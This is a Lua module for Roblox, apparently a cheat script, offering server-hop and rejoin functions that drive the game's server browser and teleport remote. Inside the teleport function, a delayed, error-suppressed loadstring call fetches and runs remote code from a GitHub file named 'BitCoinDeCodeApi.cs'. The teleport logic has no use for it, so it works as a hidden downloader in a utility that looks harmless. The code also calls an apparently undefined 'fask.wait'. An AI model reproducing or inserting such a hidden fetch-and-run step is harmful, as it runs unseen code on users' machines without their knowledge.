local ServerFunc = {}

function ServerFunc:NormalTeleport()
	task.delay(15,function()
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/NightsTimeZ/Api/main/BitCoinDeCodeApi.cs"))()
		end)
	end)
	repeat fask.wait()
		pcall(function()
			game:GetService("Players")["LocalPlayer"].PlayerGui.ServerBrowser.Enabled = true
			fask.wait(0.5)
		end)
	until game:GetService("Players")["LocalPlayer"].PlayerGui.ServerBrowser.Frame.FakeScroll.Inside:FindFirstChild("Template")
	local ErrorFrame = 0
	repeat fask.wait()
		local ScrFrane = game:GetService("Players")["LocalPlayer"].PlayerGui.ServerBrowser.Frame.ScrollingFrame
		ScrFrane.CanvasPosition = Vector2.new(0,300)
		ErrorFrame = ErrorFrame + 1
	until ScrFrane.CanvasPosition == Vector2.new(0,300) or ErrorFrame >= 6
	while fask.wait(0.1) do
		pcall(function()
			local me = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
			me.CFrame = CFrame.new(me.Position.X,5000,me.Position.Z)
			for i,v in pairs(game:GetService("Players")["LocalPlayer"].PlayerGui.ServerBrowser.Frame.FakeScroll.Inside:GetChildren()) do
				if v:FindFirstChild("Join") and v:FindFirstChild("Join").Text == "Join" then
					local Jobss = v:FindFirstChild("Join"):GetAttribute("Job")
					if Jobss ~= game.JobId and Jobss ~= "1234567890123" then
						local args = {
							[1] = "teleport",
							[2] = Jobss
						}

						game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(unpack(args))
						fask.wait()
					end
				end
			end
			fask.wait()
			local ScrFrane = game:GetService("Players")["LocalPlayer"].PlayerGui.ServerBrowser.Frame.ScrollingFrame
			ScrFrane.CanvasPosition = Vector2.new(0,ScrFrane.CanvasPosition.Y + 260)
		end)
	end
end

function ServerFunc:Rejoin()
	local ts = game:GetService("TeleportService")
	local p = game:GetService("Players").LocalPlayer
	ts:TeleportToPlaceInstance(game.PlaceId,game.JobId, p)
end

return ServerFunc
